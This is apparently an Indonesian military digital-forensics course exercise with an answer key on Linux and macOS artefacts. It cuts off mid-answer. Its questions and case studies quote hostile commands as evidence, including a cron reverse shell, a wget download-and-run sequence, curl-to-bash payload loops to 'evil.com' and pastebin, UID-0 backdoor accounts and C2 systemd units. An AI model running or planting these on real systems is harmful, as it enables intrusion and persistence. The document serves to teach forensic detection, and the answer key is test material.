# Latihan Pertemuan 07: Forensik Linux dan Pengenalan Mac OS

**Mata Kuliah:** Digital Forensic for Military Purposes  
**SKS:** 3 SKS  
**Pertemuan:** 07  
**Topik:** Forensik Linux dan Pengenalan Mac OS  
**Pengampu:** Anindito, S.Kom., S.S., S.H., M.TI., CHFI  

---

## Petunjuk Pengerjaan

1. Kerjakan semua soal secara mandiri
2. Waktu pengerjaan: 120 menit
3. Untuk soal pilihan ganda, pilih satu jawaban yang paling tepat
4. Untuk soal uraian, jawab dengan lengkap dan sistematis
5. Studi kasus memerlukan analisis mendalam dan penerapan konsep

---

## Bagian A: Soal Pilihan Ganda (20 Soal)

### Soal 1
Dalam Linux, direktori yang menyimpan seluruh file konfigurasi sistem adalah:

A. /var  
B. /home  
C. /etc  
D. /usr  
E. /opt

---

### Soal 2
Berapa jumlah timestamp yang disimpan dalam inode pada filesystem ext4?

A. 2 (atime, mtime)  
B. 3 (atime, mtime, ctime)  
C. 4 (atime, mtime, ctime, crtime)  
D. 5 (atime, mtime, ctime, crtime, dtime)  
E. 1 (mtime saja)

---

### Soal 3
Pada file `/etc/passwd`, field ketiga (setelah username dan password placeholder) menunjukkan:

A. Group ID (GID)  
B. User ID (UID)  
C. Home directory  
D. GECOS field  
E. Login shell

---

### Soal 4
Entry berikut ditemukan di `/etc/passwd`:
```
sysadm:x:0:0::/var/tmp:/bin/bash
```
Mengapa entry ini sangat mencurigakan dari perspektif forensik?

A. Karena menggunakan shell `/bin/bash`  
B. Karena GECOS field kosong  
C. Karena memiliki UID 0 yang memberikan hak root penuh  
D. Karena home directory di `/var/tmp`  
E. Karena C dan D keduanya benar — UID 0 selain root dan home di lokasi temp

---

### Soal 5
Prefix `$6$` pada hash password di `/etc/shadow` menunjukkan penggunaan algoritma:

A. MD5  
B. Blowfish  
C. SHA-256  
D. SHA-512  
E. yescrypt

---

### Soal 6
File `.bash_history` yang berukuran 0 byte pada akun yang aktif paling mungkin mengindikasikan:

A. Akun tersebut baru dibuat dan belum pernah digunakan  
B. Disk penuh sehingga history tidak bisa ditulis  
C. Upaya anti-forensik untuk menghapus jejak aktivitas  
D. Bug pada konfigurasi bash shell  
E. Sistem baru saja di-restart

---

### Soal 7
Variabel environment yang menentukan apakah bash history disimpan dengan timestamp adalah:

A. HISTSIZE  
B. HISTFILE  
C. HISTTIMEFORMAT  
D. HISTCONTROL  
E. HISTFILESIZE

---

### Soal 8
Pada sistem Debian/Ubuntu, log autentikasi (login, logout, sudo) secara default disimpan di:

A. /var/log/syslog  
B. /var/log/auth.log  
C. /var/log/secure  
D. /var/log/messages  
E. /var/log/daemon.log

---

### Soal 9
File `/var/log/wtmp` dan `/var/log/btmp` merupakan file log binary. Perintah yang tepat untuk membaca masing-masing adalah:

A. cat dan more  
B. last dan lastb  
C. grep dan awk  
D. journalctl dan systemctl  
E. strings dan hexdump

---

### Soal 10
Seorang investigator menemukan cron job berikut:
```
*/5 * * * * root bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
```
Apa tujuan dari cron job ini?

A. Backup otomatis setiap 5 menit  
B. Monitoring jaringan berkala  
C. Reverse shell ke attacker setiap 5 menit  
D. Sinkronisasi waktu sistem  
E. Rotasi log otomatis

---

### Soal 11
Lokasi crontab per-user pada sistem Debian/Ubuntu adalah:

A. /etc/crontab  
B. /etc/cron.d/  
C. /var/spool/cron/crontabs/  
D. /usr/local/cron/  
E. ~/.crontab

---

### Soal 12
Dalam konteks forensik Linux, teknik "Living off the Land" (LotL) mengacu pada:

A. Penggunaan malware khusus yang dibuat untuk Linux  
B. Penggunaan fitur dan tool legitimate sistem operasi untuk persistence  
C. Instalasi rootkit pada kernel Linux  
D. Enkripsi seluruh filesystem untuk menghambat investigasi  
E. Penggunaan virtual machine untuk menyembunyikan aktivitas

---

### Soal 13
Untuk mencari semua file tersembunyi (hidden) yang baru dibuat di seluruh filesystem Linux, perintah yang tepat adalah:

A. `ls -la / 2>/dev/null`  
B. `find / -name ".*" -type f -newer /etc/passwd 2>/dev/null`  
C. `grep -r "hidden" / 2>/dev/null`  
D. `locate --hidden / 2>/dev/null`  
E. `stat -c "%n" / 2>/dev/null`

---

### Soal 14
Filesystem default pada macOS modern adalah:

A. HFS+  
B. ext4  
C. APFS  
D. NTFS  
E. ZFS

---

### Soal 15
Artefak macOS yang mencatat setiap perubahan filesystem dan tetap menyimpan informasi meskipun file sudah dihapus adalah:

A. Spotlight  
B. Plist files  
C. FSEvents  
D. Unified Logs  
E. Time Machine

---

### Soal 16
Pada macOS, file konfigurasi utama menggunakan format:

A. Registry entries (seperti Windows)  
B. Text-based configuration files (seperti Linux)  
C. Property list (plist) — binary atau XML  
D. JSON configuration files  
E. YAML configuration files

---

### Soal 17
Perintah Linux berikut:
```
grep "Failed password" /var/log/auth.log | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort | uniq -c | sort -rn | head -10
```
Menghasilkan output berupa:

A. Daftar 10 user yang paling sering gagal login  
B. Daftar 10 IP address dengan login gagal terbanyak  
C. Daftar 10 port yang paling sering diserang  
D. Daftar 10 timestamp serangan terbaru  
E. Daftar 10 service yang paling sering error

---

### Soal 18
File SSH yang menjadi target utama penyerang untuk memperoleh persistent access tanpa password adalah:

A. ~/.ssh/known_hosts  
B. ~/.ssh/config  
C. ~/.ssh/authorized_keys  
D. /etc/ssh/sshd_config  
E. ~/.ssh/id_rsa.pub

---

### Soal 19
Untuk menganalisis log systemd journal pada rentang waktu tertentu, perintah yang tepat adalah:

A. `cat /var/log/journal --since "2026-01-15"`  
B. `journalctl --since "2026-01-15 00:00:00" --until "2026-01-15 23:59:59"`  
C. `systemctl log --date "2026-01-15"`  
D. `dmesg --since "2026-01-15"`  
E. `syslog --range "2026-01-15"`

---

### Soal 20
Fitur APFS yang secara forensik sangat menguntungkan karena memungkinkan pemulihan versi data sebelumnya adalah:

A. Native encryption  
B. Space sharing  
C. Copy-on-Write (CoW) dan snapshots  
D. Case-sensitive filenames  
E. Nanosecond timestamps

---

## Bagian B: Soal Uraian (15 Soal)

### Soal 1 ⭐
Jelaskan perbedaan antara direktori `/tmp` dan `/var/tmp` dalam Linux dari perspektif forensik! Mengapa penyerang sering menggunakan keduanya?

---

### Soal 2 ⭐
Sebutkan dan jelaskan empat timestamp yang disimpan dalam inode ext4 (atime, mtime, ctime, crtime)! Berikan contoh skenario forensik untuk masing-masing.

---

### Soal 3 ⭐
Jelaskan format entry dalam file `/etc/passwd`! Identifikasi minimal 3 red flags yang mengindikasikan backdoor account.

---

### Soal 4 ⭐
Apa perbedaan antara file `/etc/passwd` dan `/etc/shadow`? Mengapa pemisahan ini penting dari perspektif keamanan?

---

### Soal 5 ⭐⭐
Seorang investigator menemukan `.bash_history` berisi perintah-perintah berikut:
```
wget http://198.51.100.55/payload.sh -O /tmp/.update
chmod +x /tmp/.update
nohup /tmp/.update &
rm /tmp/.update
unset HISTFILE
```
Analisis setiap perintah dan jelaskan pola serangan yang terjadi!

---

### Soal 6 ⭐⭐
Jelaskan perbedaan antara syslog tradisional dan systemd-journald! Kapan investigator harus menggunakan `grep` vs `journalctl`?

---

### Soal 7 ⭐⭐
Jelaskan bagaimana cron jobs dan systemd timers dapat digunakan sebagai mekanisme persistence oleh penyerang! Berikan contoh entry mencurigakan untuk masing-masing dan cara mendeteksinya.

---

### Soal 8 ⭐⭐
Analisis log auth.log berikut:
```
Feb 14 02:30:01 mil-srv sshd: Failed password for root from 203.0.113.99
Feb 14 02:30:02 mil-srv sshd: Failed password for admin from 203.0.113.99
Feb 14 02:30:03 mil-srv sshd: Failed password for operator from 203.0.113.99
Feb 14 02:30:45 mil-srv sshd: Accepted password for www-data from 203.0.113.99
Feb 14 02:31:10 mil-srv sudo: www-data : USER=root ; COMMAND=/bin/bash
```
Jelaskan apa yang terjadi, jenis serangannya, dan tindakan investigasi selanjutnya!

---

### Soal 9 ⭐⭐
Jelaskan minimal 5 teknik Living off the Land (LotL) pada Linux! Untuk setiap teknik, berikan mekanisme dan metode deteksinya.

---

### Soal 10 ⭐⭐
Apa peran file `~/.ssh/authorized_keys` dalam forensik? Bagaimana penyerang mengeksploitasinya dan bagaimana investigator dapat mendeteksi SSH key injection?

---

### Soal 11 ⭐⭐
Jelaskan perbedaan antara file log text-based (syslog, auth.log) dan file log binary (wtmp, btmp, lastlog) di Linux! Sebutkan tool yang digunakan untuk membaca masing-masing.

---

### Soal 12 ⭐⭐⭐
Anda menemukan systemd service file berikut di `/etc/systemd/system/`:
```ini
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.svc_helper -c 203.0.113.88 -p 443
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```
Lakukan analisis forensik terhadap service file ini! Identifikasi semua indikator mencurigakan dan jelaskan fungsi setiap bagiannya.

---

### Soal 13 ⭐⭐⭐
Bandingkan forensik Linux dan forensik macOS dari aspek: (a) filesystem, (b) mekanisme logging, (c) format konfigurasi, (d) scheduled tasks, dan (e) tantangan utama investigasi. Gunakan tabel perbandingan.

---

### Soal 14 ⭐⭐⭐
Jelaskan secara detail artefak-artefak forensik utama macOS (plist, Spotlight, FSEvents, Unified Logs)! Untuk masing-masing, jelaskan lokasi, format, jenis informasi yang tersedia, dan tool yang digunakan untuk analisis.

---

### Soal 15 ⭐⭐⭐
Buat prosedur lengkap timeline analysis menggunakan plaso/log2timeline untuk menganalisis disk image Linux! Jelaskan setiap langkah dari akuisisi hingga visualisasi timeline, termasuk perintah yang digunakan dan sumber artefak yang dikumpulkan.

---

## Bagian C: Studi Kasus (2 Kasus)

### Studi Kasus 1: Kompromi Server Database Kodam XIV/Hasanuddin

**Latar Belakang:**

Tim SOC Kodam XIV/Hasanuddin mendeteksi anomali pada server database utama (hostname: `kodam14-db`, OS: Ubuntu Server 22.04 LTS, filesystem: ext4). Alert dipicu oleh monitoring system yang mencatat transfer data volume besar pada dini hari. Server ini menyimpan database personel, logistik, dan rencana operasi.

**Bukti yang Tersedia:**

Investigator telah mengamankan disk image server dan mengekstrak log berikut:

```
Jan 20 02:15:30 kodam14-db sshd[5521]: Accepted publickey for admin from 192.168.10.5 port 48210
Jan 20 02:15:45 kodam14-db sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt list --installed
Jan 20 02:16:20 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Jan 20 02:16:45 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/mysqldump --all-databases -u root -p > /tmp/all_db.sql
Jan 20 02:19:30 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/tar czf /tmp/.backup.tar.gz /tmp/all_db.sql
Jan 20 02:20:10 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/scp /tmp/.backup.tar.gz admin@172.16.0.99:/data/
Jan 20 02:21:30 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/shred -n 3 -z /tmp/all_db.sql /tmp/.backup.tar.gz
Jan 20 02:22:00 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/sbin/service rsyslog stop
Jan 20 02:22:15 kodam14-db sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /var/log/auth.log
```

**Informasi Tambahan:**
- Akun `admin` memiliki authorized SSH key; password tidak digunakan
- IP 192.168.10.5 adalah workstation di lantai operasi
- IP 172.16.0.99 tidak terdaftar dalam asset inventory Kodam
- Server tidak memiliki Intrusion Detection System (IDS)
- Crontab user `admin` terakhir dimodifikasi pada 20 Januari 02:23

**Pertanyaan:**

**1a.** Buat timeline kronologis dari insiden ini berdasarkan log yang tersedia! Identifikasi setiap fase serangan menggunakan framework attack chain! (15 poin)

**1b.** Identifikasi minimal 8 artefak forensik Linux yang harus dikumpulkan dan dianalisis dari server ini! Urutkan berdasarkan prioritas dan jelaskan informasi yang diharapkan dari masing-masing! (15 poin)

**1c.** Investigator menemukan bahwa rsyslog sudah dihentikan dan auth.log telah di-truncate. Jelaskan sumber bukti alternatif yang masih dapat digunakan dan perintah untuk mengaksesnya! (15 poin)

**1d.** Analisis teknik anti-forensik yang digunakan pelaku dalam kasus ini! Untuk setiap teknik, jelaskan efektivitasnya dan bagaimana investigator dapat mengatasinya! (15 poin)

**1e.** Buat rekomendasi forensic readiness untuk mencegah insiden serupa di masa depan! Berikan minimal 5 rekomendasi teknis yang spesifik untuk infrastruktur Linux militer. (10 poin)

---

### Studi Kasus 2: Backdoor Persistence pada Web Server Lantamal

**Latar Belakang:**

Pangkalan Utama TNI AL (Lantamal) mengoperasikan web server internal (hostname: `lantamal-web`, OS: CentOS 8, nginx web server) yang digunakan untuk portal informasi dan sistem pelaporan. Tim keamanan menemukan beberapa indikator kompromi selama audit rutin.

**Temuan Audit:**

1. File tersembunyi di `/tmp/.cache/update.sh` yang berisi:
```bash
#!/bin/bash
while true; do
    curl -s http://pastebin.com/raw/Abc123dE | bash
    sleep 180
done
```

2. Entry di `/var/spool/cron/nginx`:
```
*/3 * * * * /tmp/.cache/update.sh > /dev/null 2>&1
```

3. Entry baru di `/etc/passwd`:
```
sysmon:x:0:0:System Monitor:/dev/shm:/bin/bash
```

4. File `/home/nginx/.ssh/authorized_keys` berisi public key yang tidak dikenali oleh administrator.

5. File `/etc/systemd/system/sys-monitor.service`:
```ini
[Unit]
Description=System Monitoring Daemon

[Service]
ExecStart=/usr/local/bin/.monitor -connect 198.51.100.77:8443
Restart=always

[Install]
WantedBy=multi-user.target
```

6. Timestamp analisis:
   - `/tmp/.cache/update.sh`: crtime Jan 5, mtime Jan 5
   - `/etc/passwd`: mtime Jan 5 (sebelumnya Dec 15)
   - `authorized_keys`: mtime Jan 5
   - `sys-monitor.service`: crtime Jan 5, mtime Jan 5

**Pertanyaan:**

**2a.** Klasifikasikan setiap temuan (1-5) berdasarkan jenis persistence mechanism yang digunakan! Jelaskan bagaimana masing-masing bekerja dan tingkat bahayanya! (15 poin)

**2b.** Berdasarkan timestamp, buat rekonstruksi kronologis serangan! Kapan initial compromise terjadi? Apa saja langkah yang dilakukan penyerang? (15 poin)

**2c.** Untuk setiap temuan, tuliskan perintah Linux yang tepat untuk mendeteksi dan menganalisis artefak tersebut! Minimal 2 perintah per temuan. (15 poin)

**2d.** Jelaskan mengapa penyerang menggunakan multiple persistence mechanisms! Apa keuntungan dan risiko bagi penyerang dari pendekatan ini? Kaitkan dengan konsep defense-in-depth dari perspektif attacker. (10 poin)

**2e.** Buat rencana remediation dan hardening untuk server ini! Sertakan langkah-langkah forensik yang harus dilakukan sebelum remediation dan konfigurasi pencegahan yang harus diterapkan. (10 poin)

---

## Kunci Jawaban

### Bagian A: Pilihan Ganda

| No | Jawaban | Penjelasan |
|----|---------|------------|
| 1 | **C** | Direktori `/etc` (et cetera) menyimpan seluruh file konfigurasi sistem seperti passwd, shadow, fstab, crontab |
| 2 | **C** | ext4 menyimpan 4 timestamp: atime (access), mtime (modify), ctime (change), crtime (creation/birth) |
| 3 | **B** | Format /etc/passwd: username:x:UID:GID:GECOS:home:shell — field ketiga adalah User ID |
| 4 | **E** | Kombinasi UID 0 (hak root) DAN home di /var/tmp keduanya mencurigakan — backdoor account |
| 5 | **D** | Prefix $6$ menandakan SHA-512; $1$=MD5, $2b$=Blowfish, $5$=SHA-256, $y$=yescrypt |
| 6 | **C** | File history 0 byte pada akun aktif sangat mengindikasikan anti-forensik (history -c, HISTSIZE=0, dll) |
| 7 | **C** | HISTTIMEFORMAT menentukan format timestamp pada bash history, misalnya `%F %T ` |
| 8 | **B** | Debian/Ubuntu menggunakan /var/log/auth.log; RHEL/CentOS menggunakan /var/log/secure |
| 9 | **B** | wtmp dibaca dengan `last`, btmp dibaca dengan `lastb` — keduanya file binary |
| 10 | **C** | Entry cron ini membuat reverse shell ke IP 10.0.0.99 port 4444 setiap 5 menit |
| 11 | **C** | Crontab per-user pada Debian/Ubuntu disimpan di /var/spool/cron/crontabs/ |
| 12 | **B** | LotL menggunakan fitur dan tool bawaan OS (cron, systemd, SSH, iptables) — sulit dideteksi |
| 13 | **B** | `find / -name ".*" -type f -newer /etc/passwd 2>/dev/null` mencari hidden files lebih baru dari /etc/passwd |
| 14 | **C** | APFS (Apple File System) adalah filesystem default macOS sejak High Sierra (2017) |
| 15 | **C** | FSEvents mencatat setiap create/modify/delete pada filesystem, termasuk file yang sudah dihapus |
| 16 | **C** | macOS menggunakan plist (Property List) dalam format binary (bplist) atau XML |
| 17 | **B** | Pipeline ini mengekstrak IP dari failed password, menghitung frekuensi, dan menampilkan top 10 |
| 18 | **C** | authorized_keys berisi public key yang diizinkan login — penyerang menambahkan key mereka |
| 19 | **B** | journalctl dengan --since dan --until memfilter log berdasarkan rentang waktu |
| 20 | **C** | CoW menyimpan data lama saat modifikasi, dan snapshots memungkinkan pemulihan state sebelumnya |

---

### Bagian B: Uraian

#### Jawaban Soal 1 ⭐

**Perbedaan /tmp dan /var/tmp:**

| Aspek | /tmp | /var/tmp |
|-------|------|----------|
| Pembersihan | Dibersihkan saat reboot (systemd-tmpfiles-clean) | Bertahan setelah reboot, dibersihkan setelah 30 hari |
| Izin akses | Writable oleh semua user (sticky bit) | Writable oleh semua user (sticky bit) |
| Ukuran | Sering di-mount sebagai tmpfs (RAM) | Disk-based storage |

**Alasan penyerang menggunakan keduanya:**
- **Writable oleh semua user** — tidak perlu privilege khusus untuk menulis file
- **Jarang dimonitor** — administrator sering mengabaikan isi direktori temp
- **Self-cleaning** — /tmp dibersihkan otomatis, menghilangkan bukti setelah reboot
- **Hidden files** — file diawali titik (`.file`) tersembunyi dari `ls` biasa

---

#### Jawaban Soal 2 ⭐

| Timestamp | Nama Lengkap | Berubah Ketika | Skenario Forensik |
|-----------|-------------|----------------|-------------------|
| **atime** | Access Time | File dibaca/diakses | Mendeteksi kapan dokumen rahasia terakhir dibuka oleh pelaku |
| **mtime** | Modification Time | Konten file dimodifikasi | Mendeteksi kapan konfigurasi firewall diubah oleh penyerang |
| **ctime** | Change Time | Metadata (permission, ownership) berubah | Mendeteksi perubahan permission file (chmod) atau ownership (chown) |
| **crtime** | Creation/Birth Time | Tidak pernah berubah | Menentukan kapan file malware pertama kali dibuat di sistem |

**Catatan penting:** crtime hanya tersedia di ext4 (tidak di ext3). Gunakan perintah `stat` untuk melihat semua timestamp, atau `debugfs` untuk crtime pada ext4.

---

#### Jawaban Soal 3 ⭐

**Format entry /etc/passwd:**
```
username:x:UID:GID:GECOS:home_directory:login_shell
```

| Field | Keterangan |
|-------|-----------|
| username | Nama login (1-32 karakter) |
| x | Placeholder password (hash di /etc/shadow) |
| UID | User ID (0 = root, 1000+ = regular user) |
| GID | Primary Group ID |
| GECOS | Informasi deskriptif (nama lengkap, dll) |
| home_directory | Lokasi home directory user |
| login_shell | Shell default saat login |

**Red flags backdoor account:**
1. **UID 0 selain root** — memberikan hak akses root penuh
2. **Home directory di /tmp, /var/tmp, /dev/shm** — lokasi sementara untuk menyembunyikan aktivitas
3. **GECOS field kosong** — akun dibuat tanpa identitas
4. **Shell valid (/bin/bash, /bin/sh) pada service account** — service account seharusnya /usr/sbin/nologin
5. **Username menyerupai service name** — seperti "syslog2", "httpd-admin" untuk mengelabui

---

#### Jawaban Soal 4 ⭐

**Perbedaan /etc/passwd dan /etc/shadow:**

| Aspek | /etc/passwd | /etc/shadow |
|-------|-------------|-------------|
| Akses | Readable oleh semua user (644) | Hanya root yang bisa baca (640) |
| Isi | Informasi akun (UID, GID, home, shell) | Hash password dan policy kedaluwarsa |
| Password | Placeholder "x" | Hash aktual ($6$salt$hash) |
| Tujuan | Pemetaan username ↔ UID | Keamanan password |

**Pentingnya pemisahan:** Sebelum shadow passwords, hash password disimpan di /etc/passwd yang readable oleh semua user — memungkinkan offline cracking. Dengan pemisahan, hash hanya bisa diakses oleh root, meningkatkan keamanan secara signifikan.

---

#### Jawaban Soal 5 ⭐⭐

**Analisis per perintah:**

| Perintah | Tujuan | Fase Serangan |
|----------|--------|---------------|
| `wget http://198.51.100.55/payload.sh -O /tmp/.update` | Download payload dari server penyerang, simpan sebagai hidden file | **Delivery & Installation** |
| `chmod +x /tmp/.update` | Buat file executable | **Installation** |
| `nohup /tmp/.update &` | Jalankan payload di background, tetap berjalan setelah logout | **Execution** |
| `rm /tmp/.update` | Hapus file payload dari disk | **Anti-forensik** |
| `unset HISTFILE` | Mencegah perintah selanjutnya disimpan ke history | **Anti-forensik** |

**Pola serangan:** Download → Prepare → Execute → Clean Evidence. Catatan: `rm` menghapus directory entry tapi konten file masih bisa di-recover karena proses masih menggunakan file (file descriptor masih terbuka di /proc/[pid]/fd/).

---

#### Jawaban Soal 6 ⭐⭐

| Aspek | syslog Tradisional | systemd-journald |
|-------|-------------------|-----------------|
| Format penyimpanan | Text files di /var/log/ | Binary database |
| Persistence | Selalu persistent | Persistent jika dikonfigurasi |
| Metadata | Timestamp, facility, severity | Timestamp, PID, UID, unit, boot ID, dll |
| Pencarian | grep, awk, sed | journalctl dengan filter |
| Rotasi | logrotate (compress/delete) | Otomatis (size/time-based) |
| Tampering | Mudah dimanipulasi | Lebih sulit, ada sealing |

**Kapan menggunakan grep vs journalctl:**
- **grep**: Untuk file log text tradisional (/var/log/auth.log, /var/log/syslog), analisis multi-file, dan scripting
- **journalctl**: Untuk structured queries, filter berdasarkan unit/boot/priority, dan export ke JSON

---

#### Jawaban Soal 7 ⭐⭐

**Cron jobs sebagai persistence:**
```
# Contoh mencurigakan
*/5 * * * * root curl -s http://evil.com/payload | bash
```
- **Deteksi:** Periksa `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/crontabs/`, dan `crontab -l -u <user>` untuk semua user

**Systemd timers sebagai persistence:**
```ini
# /etc/systemd/system/backdoor.service
[Service]
ExecStart=/usr/local/bin/.helper -c 10.0.0.99
Restart=always
```
- **Deteksi:** `systemctl list-timers --all`, periksa `/etc/systemd/system/` dan `/run/systemd/system/` untuk unit files yang tidak dikenal

**Perbandingan:**
- Cron lebih sederhana dan legacy-friendly
- Systemd lebih powerful (auto-restart, dependency management)
- Penyerang sering menggunakan keduanya untuk redundancy

---

#### Jawaban Soal 8 ⭐⭐

**Analisis insiden:**

1. **02:30:01–02:30:03:** Brute-force dictionary attack dari IP 203.0.113.99 — mencoba root, admin, operator dalam waktu singkat
2. **02:30:45:** Login berhasil sebagai `www-data` — akun web server yang seharusnya non-interactive berhasil dibobol
3. **02:31:10:** Privilege escalation — www-data menjalankan sudo ke root dengan /bin/bash

**Jenis serangan:** Brute-force SSH diikuti privilege escalation

**Tindakan investigasi:**
1. Periksa `/var/log/auth.log` untuk total failed attempts dan IP lain
2. Analisis `~www-data/.bash_history` untuk aktivitas setelah mendapat root
3. Periksa `last` dan `lastb` untuk session history
4. Audit crontab www-data dan systemd services untuk persistence
5. Periksa `/etc/sudoers` — mengapa www-data memiliki sudo access?
6. Analisis network logs untuk koneksi keluar mencurigakan
7. Block IP 203.0.113.99 di firewall

---

#### Jawaban Soal 9 ⭐⭐

| No | Teknik LotL | Mekanisme | Deteksi |
|----|------------|-----------|---------|
| 1 | Cron persistence | Cron job menjalankan reverse shell/downloader | Audit semua crontab: `for u in $(cut -d: -f1 /etc/passwd); do crontab -l -u $u; done` |
| 2 | Systemd service | Custom unit file untuk backdoor binary | `systemctl list-units --all`, periksa /etc/systemd/system/ |
| 3 | SSH key injection | Tambah public key ke authorized_keys | `find / -name authorized_keys -exec cat {} +` |
| 4 | Bashrc modification | Sisipkan perintah malicious di ~/.bashrc | Periksa seluruh .bashrc, .bash_profile, .profile untuk perintah aneh |
| 5 | LD_PRELOAD hijack | Set LD_PRELOAD di /etc/ld.so.preload | `cat /etc/ld.so.preload`, `ldd` untuk verifikasi shared libraries |
| 6 | PAM backdoor | Modifikasi PAM module untuk bypass auth | `md5sum /lib/*/security/pam_*.so` dan bandingkan dengan baseline |
| 7 | rc.local/init.d | Script startup di legacy init system | Periksa /etc/rc.local, /etc/init.d/ untuk script non-standar |

---

#### Jawaban Soal 10 ⭐⭐

**Peran `~/.ssh/authorized_keys`:** File ini berisi daftar public key yang diizinkan login SSH ke akun tersebut tanpa password. Setiap baris berisi satu public key.

**Eksploitasi oleh penyerang:**
1. Penyerang membuat key pair (ssh-keygen)
2. Menambahkan public key mereka ke authorized_keys target
3. Login tanpa password kapan saja — persisten bahkan jika password diubah

**Deteksi SSH key injection:**
1. `find / -name authorized_keys -exec ls -la {} \; 2>/dev/null` — cari semua authorized_keys
2. `stat ~/.ssh/authorized_keys` — periksa timestamps untuk modifikasi mencurigakan
3. Bandingkan jumlah key dengan daftar resmi/authorized
4. Periksa comment field pada key — key penyerang sering tanpa comment atau dengan comment generik
5. Korelasi dengan auth.log — cari entry "Accepted publickey" dari IP tidak dikenal

---

#### Jawaban Soal 11 ⭐⭐

| Aspek | Text-based Logs | Binary Logs |
|-------|----------------|-------------|
| Format | Plain text (ASCII/UTF-8) | Struktur binary khusus |
| Contoh | syslog, auth.log, kern.log | wtmp, btmp, lastlog, journal |
| Cara baca | cat, grep, awk, sed, less | Tool khusus |
| Kemudahan manipulasi | Mudah diedit dengan text editor | Lebih sulit dimanipulasi |
| Ukuran | Lebih besar | Lebih kompak |
| Pencarian | grep, regex | Tool-specific queries |

**Tools untuk masing-masing:**
- `wtmp` → `last`, `utmpdump`
- `btmp` → `lastb`, `utmpdump`
- `lastlog` → `lastlog`
- `systemd journal` → `journalctl`
- Text logs → `grep`, `awk`, `sed`, `zgrep` (untuk .gz)

---

#### Jawaban Soal 12 ⭐⭐⭐

**Analisis forensik service file:**

| Elemen | Nilai | Analisis | Indikator |
|--------|-------|----------|-----------|
| Description | "System Health Monitor" | Nama sengaja dibuat menyerupai service legitimate | 🟡 Social engineering |
| After | network.target | Memastikan network tersedia sebelum start | 🔴 Butuh koneksi jaringan |
| ExecStart | `/usr/local/bin/.svc_helper` | Binary tersembunyi (diawali titik) | 🔴 Hidden binary |
| Parameter | `-c 203.0.113.88 -p 443` | Connect ke IP dengan port 443 (HTTPS) | 🔴 C2 communication |
| Restart | always | Auto-restart jika proses mati | 🔴 Persistent — sulit dihentikan |
| RestartSec | 30 | Interval restart 30 detik | 🟡 Quick reconnection |
| WantedBy | multi-user.target | Start otomatis saat boot | 🔴 Boot persistence |

**Kesimpulan:** Service ini adalah backdoor C2 beacon yang:
- Menyamar dengan nama legitimate
- Menggunakan hidden binary
- Berkomunikasi ke server C2 via port 443 (bypass firewall)
- Persistent: auto-restart + auto-start at boot

**Langkah investigasi:**
1. `md5sum /usr/local/bin/.svc_helper` — hash binary
2. `strings /usr/local/bin/.svc_helper` — cari string IoC
3. `strace -p $(pgrep svc_helper)` — trace system calls (jika live)
4. `ss -tnp | grep svc_helper` — cek koneksi aktif

---

#### Jawaban Soal 13 ⭐⭐⭐

| Aspek | Linux | macOS |
|-------|-------|-------|
| **Filesystem** | ext4 (default), XFS, Btrfs; journal-based; 4 timestamps di ext4 | APFS (default); Copy-on-Write; snapshots; native encryption; nanosecond timestamps |
| **Logging** | syslog (text) + systemd-journald (binary); distributed di /var/log/ | Unified Logs (binary terpusat); dibaca dengan `log show`; lokasi di /var/db/diagnostics/ |
| **Konfigurasi** | Text-based files di /etc/ (passwd, shadow, fstab, dll) | Property List (plist) — binary (bplist) atau XML; di ~/Library/Preferences/ |
| **Scheduled tasks** | cron (/etc/crontab, /var/spool/cron/) + systemd timers | launchd (plist-based); LaunchAgents + LaunchDaemons |
| **Tantangan utama** | Banyak distribusi dengan variasi path; anti-forensik mudah (text log) | FileVault encryption; T2/M-chip boot restrictions; proprietary format; tool berbayar |

---

#### Jawaban Soal 14 ⭐⭐⭐

| Artefak | Lokasi | Format | Informasi | Tool Analisis |
|---------|--------|--------|-----------|---------------|
| **Plist files** | ~/Library/Preferences/, /Library/Preferences/ | Binary (bplist) atau XML | Konfigurasi aplikasi, preferensi user, history browser, WiFi connections | plutil, plistutil, PlistBuddy |
| **Spotlight** | /.Spotlight-V100/ | Binary database | Nama file, path, metadata, konten teks, EXIF data, atribut Finder | mdls (metadata), mdfind (search), mac_apt |
| **FSEvents** | /.fseventsd/ | Compressed binary (gzip) | Event ID, path, event flags (create/modify/delete/rename), timestamp | FSEventsParser, mac_apt, Autopsy |
| **Unified Logs** | /var/db/diagnostics/, /var/db/uuidtext/ | Binary (tracev3) | Timestamp, process, subsystem, category, message level, OS activity | log show (macOS), macos-UnifiedLogs (cross-platform), natively supported in Axiom |

---

#### Jawaban Soal 15 ⭐⭐⭐

**Prosedur Timeline Analysis dengan Plaso:**

**Langkah 1: Persiapan**
```bash
# Install plaso
pip install plaso
# Atau gunakan Docker
docker pull log2timeline/plaso
```

**Langkah 2: Mounting disk image (read-only)**
```bash
sudo losetup -fP --read-only evidence.dd
sudo mount -o ro,noexec /dev/loop0p1 /mnt/evidence/
```

**Langkah 3: Ekstraksi timestamp dengan log2timeline**
```bash
log2timeline.py --storage-file timeline.plaso /mnt/evidence/
# Atau dari raw image langsung:
log2timeline.py --storage-file timeline.plaso evidence.dd
```

**Sumber artefak yang dikumpulkan:**
- Filesystem timestamps (atime, mtime, ctime, crtime)
- syslog, auth.log, kern.log
- .bash_history
- wtmp, btmp, lastlog
- dpkg.log (package installation)
- Apache/nginx access logs
- systemd journal
- crontab modification times
- SSH authorized_keys timestamps

**Langkah 4: Filter dan export**
```bash
# Export ke CSV dengan filter waktu
psort.py -o l2tcsv timeline.plaso "date > '2026-01-15 00:00:00' AND date < '2026-01-21 00:00:00'" > filtered_timeline.csv

# Export ke format Kibana-friendly
